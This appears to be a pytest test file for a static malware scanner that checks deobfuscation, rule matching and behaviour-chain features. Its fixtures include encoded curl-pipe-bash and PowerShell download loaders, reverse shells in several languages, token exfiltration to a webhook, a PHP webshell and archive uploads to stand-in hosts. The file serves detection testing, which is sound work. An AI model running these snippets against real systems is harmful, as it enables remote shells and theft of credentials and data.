import base64
import hashlib
import struct

import pytest

from attack_detection.binary_analysis import parse_pe
from attack_detection.fusion import fuse_engine_results
from attack_detection.features.behavior_tokens import (
    behavior_tokens,
    behavior_tokens_v3,
)
from attack_detection.features.static_features import extract_static_features
from attack_detection.reputation import HashReputationEngine
from attack_detection.rules import detect_by_rules
from attack_detection.sandbox import SandboxEngine
from attack_detection.scanner import is_allowed_file, scan_file
from attack_detection.source_masking import mask_non_executable_text
from attack_detection.static_analysis import StaticAnalysisEngine
from attack_detection.static_analysis.behavior_chains import detect_behavior_chains
from attack_detection.static_analysis.source_deobfuscation import deobfuscate_source


def _scan_with_rule_engine(
    filename: str,
    content: str,
) -> dict[str, object]:
    return scan_file(
        filename,
        content.encode("utf-8"),
        mode="standard",
        precomputed_semantic={
            "name": "codet5p",
            "status": "unavailable",
            "reason": "rule-engine test",
        },
        generate_line_attributions=False,
        run_legacy_baseline=False,
    )


def _minimal_pe() -> bytes:
    data = bytearray(0x400)
    data[:2] = b"MZ"
    struct.pack_into("<I", data, 0x3C, 0x80)
    data[0x80:0x84] = b"PE\0\0"
    struct.pack_into("<HHIIIHH", data, 0x84, 0x8664, 1, 0, 0, 0, 0xF0, 0x2022)
    optional = 0x98
    struct.pack_into("<H", data, optional, 0x20B)
    section = optional + 0xF0
    data[section:section + 8] = b".text\0\0\0"
    struct.pack_into("<IIII", data, section + 8, 0x100, 0x1000, 0x200, 0x200)
    return bytes(data)


def test_ioc_is_context_only_and_does_not_become_malicious():
    result = _scan_with_rule_engine(
        "ioc.py",
        'url = "https://example.org/download"',
    )
    assert result["final_decision"] == "benign"
    assert result["categories"] == []
    assert result["findings"] == []
    assert not any(item["name"] == "static_evidence" for item in result["engines"])
    static_engine = StaticAnalysisEngine().scan(
        'url = "https://example.org/download"',
        "python",
    )
    assert any(
        item.get("category") == "IOC 线索"
        for item in static_engine["findings"]
    )
    assert static_engine["decision"] == "not_applicable"
    assert static_engine["metadata"]["role"] == "explanation_only"
    assert static_engine["metadata"]["affects_final_decision"] is False
    assert static_engine["metadata"]["context_hits"] >= 1


def test_javascript_deobfuscation_is_not_run_after_ai_benign():
    result = _scan_with_rule_engine(
        "payload.js",
        'eval(atob("ZXZhbCh4KQ=="))',
    )
    assert result["final_decision"] == "benign"
    assert result["decision_authority"] == "ai"
    assert result["rule_disagrees_with_ai"] is False
    assert result["categories"] == []
    assert result["matches"] == []
    assert not any(item["name"] == "static_evidence" for item in result["engines"])
    static_engine = StaticAnalysisEngine().scan(
        'eval(atob("ZXZhbCh4KQ=="))',
        "javascript",
    )
    assert any(
        item.get("source") == "js_deobfuscation"
        for item in static_engine["findings"]
    )
    assert static_engine["decision"] == "not_applicable"
    assert static_engine["risk_score"] is None


@pytest.mark.parametrize(
    ("language", "content"),
    [
        ("python", 'import base64\nx=base64.b64decode("ZXZhbCh1c2VyX2lucHV0KQ==")'),
        ("php", '<?php $x=base64_decode("c3lzdGVtKCRfR0VUWydjJ10pOw=="); ?>'),
        ("bash", "echo 'Y3VybCBodHRwOi8vZXhhbXBsZS5vcmcvYSB8IGJhc2g=' | base64 -d | bash"),
        ("java", 'Base64.getDecoder().decode("UnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhjbWQp")'),
        ("go", 'base64.StdEncoding.DecodeString("ZXhlYy5Db21tYW5kKCJzaCIp")'),
        ("c", 'char *x="73797374656d2822636d642e6578652229";'),
        ("ruby", r'x = "\x73\x79\x73\x74\x65\x6d\x28\x22\x73\x68\x22\x29"'),
        (
            "powershell",
            "powershell -EncodedCommand "
            + base64.b64encode(
                'IEX (New-Object Net.WebClient).DownloadString("https://example.org/a")'.encode("utf-16le")
            ).decode("ascii"),
        ),
    ],
)
def test_cross_language_deobfuscation_decodes_literals_without_execution(language, content):
    result = StaticAnalysisEngine().scan(content, language)
    assert result["status"] == "completed"
    assert result["decision"] == "not_applicable"
    assert result["risk_score"] is None
    assert result["metadata"]["role"] == "explanation_only"
    assert result["metadata"]["affects_final_decision"] is False
    assert result["metadata"]["affects_risk_score"] is False
    assert result["metadata"]["decoded_count"] >= 1
    assert result["metadata"]["deobfuscation_language"] == language
    assert any(item.get("source") == "source_deobfuscation" for item in result["findings"])


def test_utf16le_hex_escapes_are_explained_as_readable_text():
    content = r'const value = "\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00";'

    result = deobfuscate_source(content, "javascript")

    assert result["decoded"] == [{
        "encoding": "escaped-utf-16le",
        "source": r'"\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00"',
        "decoded": "FXNBFX",
        "line": 1,
    }]
    assert "\x00" not in str(result["decoded"][0]["decoded"])


def test_dangerous_escaped_text_reports_the_decoded_preview():
    content = r'payload = "\x65\x76\x61\x6c\x28\x78\x29"'

    result = deobfuscate_source(content, "python")

    finding = next(item for item in result["findings"] if item["rule_id"] == "DEOB-EXEC")
    assert finding["decoded_preview"] == "eval(x)"
    assert "eval(x)" in finding["basis_text"]


@pytest.mark.parametrize(
    ("language", "comment"),
    [
        ("python", "# - command to start executing the newly downloaded program."),
        ("java", "// - command to start executing the newly downloaded program."),
        ("cpp", "/* - command to start executing the newly downloaded program. */"),
    ],
)
def test_comment_prose_does_not_trigger_download_execute(language, comment):
    assert detect_by_rules(comment, language) == []
    assert detect_behavior_chains(comment, language) == []
    static_result = StaticAnalysisEngine().scan(comment, language)
    assert static_result["decision"] == "not_applicable"
    assert static_result["findings"] == []


def test_comment_masking_preserves_coordinates_and_active_code():
    content = (
        'const url = "http://example.org/a"; // documentation\n'
        "/* command to start executing a downloaded program */\n"
        "subprocess.run(download_url)\n"
    )

    masked = mask_non_executable_text(content, "javascript")
    findings = detect_by_rules(content, "javascript")

    assert len(masked) == len(content)
    assert masked.count("\n") == content.count("\n")
    assert '"http://example.org/a"' in masked
    assert "documentation" not in masked
    assert any(
        item["rule_id"] == "DL-002"
        and item["line"] == 3
        and item["snippet"] == "subprocess.run(download_url)"
        for item in findings
    )


def test_sleep_api_without_sql_context_is_not_sql_injection():
    assert detect_by_rules("Sleep(20000);", "cpp") == []
    assert any(
        item["rule_id"] == "SQL-002"
        for item in detect_by_rules(
            'query = "SELECT * FROM users WHERE id = 1 OR SLEEP(5)"',
            "python",
        )
    )


def test_behavior_chain_combines_credential_read_and_network_send():
    result = _scan_with_rule_engine(
        "collector.py",
        'token = os.getenv("API_TOKEN")\nrequests.post("https://example.org", data=token)',
    )
    assert result["final_decision"] == "malicious"
    assert any(item["rule_id"] == "CHAIN-CRED-EXFIL" for item in result["findings"])


def test_native_behavior_groups_ignore_comments_and_count_executable_evidence():
    comments_only = extract_static_features(
        "/* botnet socket connect */\nint main(void) { return 0; }",
        "c",
        include_rules=False,
    )
    executable = extract_static_features(
        'int main(void) { system("cmd.exe"); socket(1, 2, 3); connect(1, 0, 0); }',
        "c",
        include_rules=False,
    )
    assert comments_only["native_behavior_group_count"] == 0
    assert comments_only["native_multi_behavior_group_proxy"] == 0
    assert executable["native_behavior_group_count"] >= 2
    assert executable["native_multi_behavior_group_proxy"] == 1


def test_file_local_behavior_groups_are_available_to_go_ruby_and_rust():
    benign_go = extract_static_features(
        'var defaultCapabilities = []string{"CAP_CHOWN", "CAP_NET_BIND_SERVICE"}',
        "go",
        include_rules=False,
    )
    malicious_go = extract_static_features(
        'func main() { system("cmd.exe"); socket(1, 2, 3); connect(1, 0, 0) }',
        "go",
        include_rules=False,
    )
    malicious_ruby = extract_static_features(
        'socket = Socket.new(:INET, :STREAM); socket.connect(addr); system("/bin/sh")',
        "ruby",
        include_rules=False,
    )
    malicious_rust = extract_static_features(
        'Command::new("cmd.exe"); TcpStream::connect("127.0.0.1:4444");',
        "rust",
        include_rules=False,
    )
    comments_only = extract_static_features(
        "// backdoor reverse shell socket connect\nfunc main() {}",
        "go",
        include_rules=False,
    )

    assert benign_go["file_local_behavior_group_count"] == 0
    assert benign_go["file_local_multi_behavior_group_proxy"] == 0
    assert malicious_go["file_local_behavior_group_count"] >= 2
    assert malicious_go["file_local_multi_behavior_group_proxy"] == 1
    assert malicious_ruby["file_local_behavior_group_count"] >= 2
    assert malicious_rust["file_local_behavior_group_count"] >= 2
    assert comments_only["file_local_behavior_group_count"] == 0


def test_collection_exfiltration_features_distinguish_network_services():
    exfiltration = extract_static_features(
        'filepath.Walk(root, collectDocs); '
        'if extension == ".pdf" { uploadfile(path) }; '
        'client, _ := sftp.NewClient(sshClient)',
        "go",
        include_rules=False,
    )
    network_service = extract_static_features(
        'server := http.Server{}; password := config.Password; '
        'tlsConfig := tls.Config{}; mqttClient := paho.NewClient(opts); '
        'gateway := NewGateway(); server.ListenAndServe()',
        "go",
        include_rules=False,
    )

    assert exfiltration["sensitive_collection_count"] >= 2
    assert exfiltration["exfiltration_channel_count"] >= 2
    assert exfiltration["collection_exfiltration_proxy"] == 1
    assert exfiltration["credential_remote_transfer_proxy"] == 0
    assert exfiltration["advanced_malicious_behavior_proxy"] == 1
    assert network_service["collection_exfiltration_proxy"] == 0
    assert network_service["credential_remote_transfer_proxy"] == 0
    assert network_service["advanced_malicious_behavior_proxy"] == 0
    assert network_service["network_service_structure_count"] >= 5
    assert network_service["heavy_network_service_structure_proxy"] == 1


def test_multilingual_command_channel_and_native_evasion_features():
    ruby = extract_static_features(
        "require 'socket'\nrequire 'open3'\n"
        "s = TCPSocket.open(host, port)\nOpen3.capture3(s.recv(4096))",
        "ruby",
        include_rules=False,
    )
    go = extract_static_features(
        'import "golang.org/x/sys/windows/registry"\n'
        'syscall.NewLazyDLL("shell32.dll").NewProc("ShellExecuteW")\n'
        'func elevate() {}',
        "go",
        include_rules=False,
    )
    rust = extract_static_features(
        "WlanGetProfile(WLAN_PROFILE_GET_PLAINTEXT_KEY); "
        "GetProcAddress(module, name); "
        "VirtualProtect(ptr, len, PAGE_EXECUTE_READ, old); "
        "FileDispositionInfo;",
        "rust",
        include_rules=False,
    )
    assert ruby["socket_command_channel_proxy"] == 1
    assert go["dynamic_winapi_resolution_count"] >= 1
    assert go["privilege_escalation_process_proxy"] == 1
    assert rust["wifi_credential_access_proxy"] == 1
    assert rust["dynamic_winapi_memory_execution_proxy"] == 1
    assert rust["self_delete_api_count"] >= 1


def test_rust_high_confidence_features_require_specific_behavior_chains():
    injection = extract_static_features(
        "NtCreateUserProcess(); NtWriteVirtualMemory(); "
        "NtCreateThreadEx();",
        "rust",
        include_rules=False,
    )
    self_delete = extract_static_features(
        "let path = std::env::current_exe(); "
        "SetFileInformationByHandle(handle, FileDispositionInfo, ptr, len);",
        "rust",
        include_rules=False,
    )
    c2 = extract_static_features(
        'let s = TcpStream::connect(host); '
        'process::Command::new("cmd.exe"); upload(); download(); persist();',
        "rust",
        include_rules=False,
    )
    benign_service = extract_static_features(
        "let listener = TcpListener::bind(addr); "
        "let password = config.password; system.configure();",
        "rust",
        include_rules=False,
    )

    assert injection["rust_offensive_behavior_count"] >= 1
    assert self_delete["rust_offensive_behavior_proxy"] == 1
    assert c2["rust_offensive_behavior_proxy"] == 1
    assert benign_service["rust_offensive_behavior_count"] == 0
    assert benign_service["rust_offensive_behavior_proxy"] == 0


def test_ruby_high_confidence_features_require_behavior_chains():
    reverse_shell = extract_static_features(
        "require 'socket'; require 'open3'; "
        "s = TCPSocket.open(host, port); "
        "command = s.gets; Open3.capture3(command); s.write(output)",
        "ruby",
        include_rules=False,
    )
    keylogger = extract_static_features(
        "require 'win32api'; get_key = Win32API.new("
        "'user32', 'GetAsyncKeyState', ['I'], 'I'); "
        "File.open('log.txt', 'a') { |f| f.write(keycode) }",
        "ruby",
        include_rules=False,
    )
    benign_server = extract_static_features(
        "require 'socket'; server = TCPServer.new(8080); "
        "client = server.accept; client.puts('hello')",
        "ruby",
        include_rules=False,
    )
    login_config = extract_static_features(
        "# Backdoor Login\nUSERNAME = 'user'\nPASSWORD = 'password'",
        "ruby",
        include_rules=False,
    )

    assert reverse_shell["ruby_offensive_behavior_proxy"] == 1
    assert keylogger["ruby_offensive_behavior_proxy"] == 1
    assert benign_server["ruby_offensive_behavior_count"] == 0
    assert login_config["ruby_offensive_behavior_count"] == 0


def test_python_high_confidence_features_ignore_copied_library_docs():
    encoded_loader = extract_static_features(
        "import base64\nexec(base64.b64decode(payload))",
        "python",
        include_rules=False,
    )
    credential_exfiltration = extract_static_features(
        "import os, requests\n"
        "token = os.environ.get('DISCORD_TOKEN')\n"
        "requests.post(webhook, json={'token': token})",
        "python",
        include_rules=False,
    )
    copied_requests_module = extract_static_features(
        '\"\"\"Example: payload = {\"key\": \"value\"}; '
        'requests.post(\"https://httpbin.org/post\", data=payload)\"\"\"\n'
        "from .api import get, post, request",
        "python",
        include_rules=False,
    )
    ordinary_deployment_helper = extract_static_features(
        "class Host:\n"
        "    def system(self):\n"
        "        return self.metadata_url\n"
        "result = host.system()",
        "python",
        include_rules=False,
    )

    assert encoded_loader["python_offensive_behavior_proxy"] == 1
    assert credential_exfiltration["python_offensive_behavior_proxy"] == 1
    assert copied_requests_module["python_offensive_behavior_count"] == 0
    assert ordinary_deployment_helper["python_offensive_behavior_count"] == 0


def test_bash_build_structure_features_cover_ci_and_cross_compile_scripts():
    android_build = extract_static_features(
        "#!/bin/sh\n"
        "export TARGET_ARCH=armv8-a\n"
        "export CFLAGS='-Os -march=armv8-a'\n"
        "export LDFLAGS='-Wl,-z,max-page-size=16384'\n"
        "HOST_COMPILER=aarch64-linux-android ./android-build.sh",
        "bash",
        include_rules=False,
    )
    compose_build = extract_static_features(
        "mvn clean package\n"
        "docker-compose -f docker-compose.yml up --no-start",
        "bash",
        include_rules=False,
    )
    simple_downloader = extract_static_features(
        "curl https://example.invalid/payload -o /tmp/payload\n"
        "chmod +x /tmp/payload",
        "bash",
        include_rules=False,
    )

    assert android_build["bash_build_script_structure_proxy"] == 1
    assert android_build["bash_android_cross_compile_proxy"] == 1
    assert compose_build["bash_build_script_structure_proxy"] == 1
    assert simple_downloader["bash_build_script_structure_count"] == 0


def test_language_specific_behavior_chains_and_local_bash_archive():
    go_reverse_shell = extract_static_features(
        'package main\nimport("net";"os/exec")\n'
        'func main(){c,_:=net.Dial("tcp","host:4444");'
        'sh:=exec.Command("/bin/sh");sh.Stdin=c;sh.Stdout=c;sh.Stderr=c;sh.Run()}',
        "go",
        include_rules=False,
    )
    go_health_check = extract_static_features(
        'package main\nimport "net"\n'
        'func main(){c,_:=net.Dial("tcp","localhost:80");c.Close()}',
        "go",
        include_rules=False,
    )
    powershell_loader = extract_static_features(
        "$w=New-Object Net.WebClient;"
        "$x=$w.DownloadString('https://example.invalid/a');"
        "IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x)))",
        "powershell",
        include_rules=False,
    )
    powershell_inventory = extract_static_features(
        "Get-Service | Select-Object Name,DisplayName | Export-Csv .\\services.csv",
        "powershell",
        include_rules=False,
    )
    rust_reverse_shell = extract_static_features(
        'use std::net::TcpStream; use std::process::{Command,Stdio};\n'
        'let s=TcpStream::connect("host:4444")?;'
        'Command::new("/bin/sh").stdin(Stdio::from(s.try_clone()?))'
        '.stdout(Stdio::from(s.try_clone()?)).stderr(Stdio::from(s)).spawn()?;',
        "rust",
        include_rules=False,
    )
    local_archive = extract_static_features(
        "mkdir -p /tmp/archive\n"
        "tar -czf /tmp/archive/configs.tgz ./configs",
        "bash",
        include_rules=False,
    )
    archive_upload = extract_static_features(
        "tar -czf /tmp/data.tgz ./data\n"
        "curl -F file=@/tmp/data.tgz https://example.invalid/upload",
        "bash",
        include_rules=False,
    )

    assert go_reverse_shell["go_offensive_behavior_proxy"] == 1
    assert go_reverse_shell["go_reverse_shell_proxy"] == 1
    assert go_reverse_shell["go_download_execute_proxy"] == 0
    assert go_reverse_shell["go_local_development_tool_proxy"] == 0
    assert go_health_check["go_offensive_behavior_count"] == 0
    go_local_tool = extract_static_features(
        'package main\nimport("os";"os/exec")\n'
        'func main(){c:=exec.Command("git","status","--porcelain");'
        'c.Stdout=os.Stdout;c.Run()}',
        "go",
        include_rules=False,
    )
    assert go_local_tool["go_local_development_tool_proxy"] == 1
    assert powershell_loader["powershell_offensive_behavior_proxy"] == 1
    assert powershell_loader["powershell_encoded_remote_loader_proxy"] == 1
    assert powershell_loader["powershell_download_execute_persist_proxy"] == 0
    assert powershell_inventory["powershell_offensive_behavior_count"] == 0
    assert rust_reverse_shell["rust_offensive_behavior_proxy"] == 1
    assert local_archive["bash_local_archive_structure_proxy"] == 1
    assert archive_upload["bash_local_archive_structure_proxy"] == 0


def test_java_javascript_and_php_behavior_chain_features():
    java_shell = extract_static_features(
        'Socket s=new Socket("host",4444);'
        'Process p=new ProcessBuilder("/bin/sh").start();'
        's.getInputStream().transferTo(p.getOutputStream());',
        "java",
        include_rules=False,
    )
    java_git = extract_static_features(
        'new ProcessBuilder("git","status","--porcelain").inheritIO().start();',
        "java",
        include_rules=False,
    )
    javascript_loader = extract_static_features(
        "fetch('https://example.invalid/a').then(r=>r.text()).then(x=>eval(x));",
        "javascript",
        include_rules=False,
    )
    javascript_git = extract_static_features(
        "const {spawn}=require('child_process');spawn('git',['status']);",
        "javascript",
        include_rules=False,
    )
    php_prepared = extract_static_features(
        "<?php $s=$pdo->prepare('SELECT name FROM users WHERE id=?');"
        "$s->execute([(int)$_GET['id']]); ?>",
        "php",
        include_rules=False,
    )
    php_shell = extract_static_features(
        "<?php eval(base64_decode($_POST['payload'])); ?>",
        "php",
        include_rules=False,
    )

    assert java_shell["java_socket_command_shell_proxy"] == 1
    assert java_git["java_local_development_tool_proxy"] == 1
    assert javascript_loader["javascript_remote_eval_loader_proxy"] == 1
    assert javascript_git["javascript_local_development_tool_proxy"] == 1
    assert php_prepared["php_prepared_query_proxy"] == 1
    assert php_shell["php_encoded_webshell_proxy"] == 1


def test_behavior_tokens_cover_ruby_command_channel_and_native_windows_actions():
    ruby_tokens = set(behavior_tokens_v3(
        "TCPSocket.open(host, port); Open3.capture3(command)",
        "ruby",
    ))
    rust_tokens = set(behavior_tokens_v3(
        "WlanGetProfile(WLAN_PROFILE_GET_PLAINTEXT_KEY); "
        "GetProcAddress(module, name); VirtualProtect(ptr, len, PAGE_EXECUTE_READ, old)",
        "rust",
    ))
    assert "__bt_chain_network_exec__" in ruby_tokens
    assert "__bt_wifi_credentials__" in rust_tokens
    assert "__bt_chain_dynamic_memory_exec__" in rust_tokens
    assert "__bt_dynamic_winapi__" not in behavior_tokens(
        "GetProcAddress(module, name)",
        "rust",
    )


def test_binary_upload_uses_original_bytes_and_read_only_pe_parser():
    payload = _minimal_pe()
    result = scan_file("sample.dll", payload)
    assert result["language"] == "binary"
    assert result["hashes"]["sha256"] == hashlib.sha256(payload).hexdigest()
    assert result["engine_votes"]["pe_static"]["metadata"]["is_pe"] is True
    assert result["engine_votes"]["pe_static"]["metadata"]["parser"] == "bounded_read_only"
    assert result["final_decision"] in {"benign", "unknown"}
    assert parse_pe(payload)["is_pe"] is True


def test_non_pe_binary_is_not_misclassified_as_pe():
    result = scan_file("sample.exe", b"not an executable")
    assert result["engine_votes"]["pe_static"]["metadata"]["is_pe"] is False


def test_zlib_wrapped_dataset_pe_is_analyzed_after_bounded_unwrap():
    import zlib

    payload = _minimal_pe() + b"http://example.test cmd.exe VirtualAlloc"
    result = scan_file("dataset-sample.exe", zlib.compress(payload))
    pe_static = result["engine_votes"]["pe_static"]

    assert pe_static["metadata"]["is_pe"] is True
    assert pe_static["metadata"]["container"] == "zlib"
    assert result["risk_score"] == 0
    assert result["risk_level"] == "unknown"
    assert result["final_decision"] == "unknown"


def test_external_features_are_safe_when_not_configured(monkeypatch):
    monkeypatch.delenv("XIEZHI_REPUTATION_PROVIDER", raising=False)
    monkeypatch.delenv("XIEZHI_VT_API_KEY", raising=False)
    reputation = HashReputationEngine().scan("a" * 64)
    sandbox = SandboxEngine().scan("x.py", b"print(1)", "a" * 64)
    assert reputation["status"] == "unavailable"
    assert sandbox["status"] == "unavailable"
    assert "execution" in sandbox["metadata"]


def test_positive_hash_reputation_requires_review_instead_of_benign():
    result = fuse_engine_results([{
        "name": "hash_reputation", "status": "completed", "decision": "unknown", "risk_score": 30,
        "metadata": {"malicious": 3, "suspicious": 0}, "findings": [],
    }])
    assert result["final_decision"] == "unknown"
    assert result["decision_basis"] == "external_context"
    assert result["risk_score"] == 0
    assert result["risk_level"] == "unknown"


def test_binary_extensions_are_allowed_but_text_input_is_not_added_back():
    assert is_allowed_file("tool.exe")
    assert is_allowed_file("library.dll")
